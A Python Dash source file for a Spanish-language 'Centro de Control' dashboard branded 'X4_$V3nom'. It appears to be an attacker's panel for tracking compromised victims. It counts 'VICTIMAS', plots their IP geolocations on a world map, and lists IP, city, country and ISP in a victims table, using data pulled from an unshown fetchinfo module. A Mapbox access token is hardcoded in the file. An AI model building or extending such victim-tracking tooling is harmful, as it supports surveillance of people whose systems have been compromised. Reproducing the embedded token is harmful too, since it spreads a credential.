import plotly.graph_objects as go
import pandas as pd
from dash import Dash, dcc, html, State, Input, Output, dash
import dash_bootstrap_components as dbc
import dash_daq as daq
from lib import fetchinfo


# Mapbox
MAPBOX_ACCESS_TOKEN = ("pk.eyJ1IjoiY3liZXJkZXZpbHoiLCJhIjoiY2t1Y3hjOG5iMTJpMzJ1bXZoZ2Z0aXZ4ZiJ9._b2kZVLFzWtDQl7_7W40dg")
querygen = "heh"

df = pd.DataFrame({
                    "Unique Key": [],
                    "Direccion IP": [],
                    "Latitud": [],
                    "Longitud": [],
                    "Ciudad": [],
                    "País": [],
                    "ISP": [],
                })
unique_key = fetchinfo.fetch_data()[0]
ip = fetchinfo.fetch_data()[1]
lat = fetchinfo.fetch_data()[2]
lon = fetchinfo.fetch_data()[3]
city = fetchinfo.fetch_data()[4]
country = fetchinfo.fetch_data()[5]
isp = fetchinfo.fetch_data()[6]


df["Unique Key"] = unique_key
df["Direccion IP"] = ip
df["Latitud"] = lat
df["Longitud"] = lon
df["Ciudad"] = city
df["País"] = country
df["ISP"] = isp

count = len(ip) 

app = dash.Dash(
    __name__,
    meta_tags=[
        {"name": "viewport", "content": "width=device-width, initial-scale=1.0"}
    ],title=".:Centro de Control:.",
    external_stylesheets=[dbc.themes.SUPERHERO]
)
# This is for start server
server = app.server
#panel led
led = html.Div(
    id="control-panel-led",
    children=[
        daq.LEDDisplay(
            id="control-panel-led-component",
            value=count,
            label="VICTIMAS",
            size=35,
            color="#00ffdd",
            backgroundColor="#1e2130",
        )
    ],
    n_clicks=0,
)
#panel lateral
victims_dropdown = dcc.Dropdown(
    id="victims-dropdown-component",
    clearable=False,
)

victims_dropdown_text = html.P(
    id="victims-dropdown-text", children=["X4_$V3nom", html.Br(), " Dashboard"]
)

victims_title = html.H1(id="victims-name", children="")

victims_body = html.P(
    className="victims-description", id="victims-description", children=[""]
)

side_panel_layout = dbc.Container(
    id="panel-side",
    children=[
        victims_dropdown_text,
        html.Div(id="victims-dropdown", children=led),
        html.Div(id="panel-side-text", children=[victims_title, victims_body]),
    ],
)

map_data = go.Figure(go.Scattermapbox(
        name="",                       
        lat=df["Latitud"],
        lon=df["Longitud"],
        mode = "markers+text",
        hovertemplate =
            "<br>" + "longitude: %{lon}<br>" + "latitude: %{lat}<br>",
        marker=go.scattermapbox.Marker(
            size=14,
            color='#00ffdd'
        ),
    ))

map_data.update_layout(
    mapbox = {
        'accesstoken': MAPBOX_ACCESS_TOKEN,
        'style': "outdoors", 'zoom': 1},
    showlegend = False)


map_graph = html.Div(

    children=[
        dcc.Graph(
            id="world-map",
            figure = map_data,
        ),
    ],
)

#Tabladetallada

tabladetail = html.Div(
    id="histogram-container",
    children=[
        html.Div(
            id="histogram-header",
            children=[
                html.H1(
                    id="histogram-title", children=["Detalle de las victimas"]
                ),
                
            ],
        ),
            html.Div(children=[

        html.Div(
            style={
                'display': 'flex',
                'justifyContent': 'center',
                'marginBottom': '20px',
            },
       

        )    
    ]),

        html.Table([
                html.Thead(
                    html.Tr([html.Th(col) for col in df.columns])
                        ),
                html.Tbody([
                    html.Tr([
                        html.Td(df.iloc[i][col]) for col in df.columns
                    ]) for i in range(len(df))
                ])
            ])
    ])
# Control panel + map
main_panel_layout = html.Div(
    id="panel-upper-lower",
    children=[
        map_graph,
        html.Div(
            id="panel",
            children=[
                tabladetail,
                html.Div(

                ),
            ],
        ),
    ],
)
root_layout = html.Div(
    id="root",
    children=[
        dcc.Store(id="store-placeholder"),
        # For the case no components were clicked, we need to know what type of graph to preserve
        dcc.Store(id="store-data-config", data={"info_type": "", "victims_type": 0}),
        side_panel_layout,
        main_panel_layout,
        

    ],
)

app.layout = root_layout


# Dash_DAQ elements


if __name__ == "__main__":
    app.run_server()
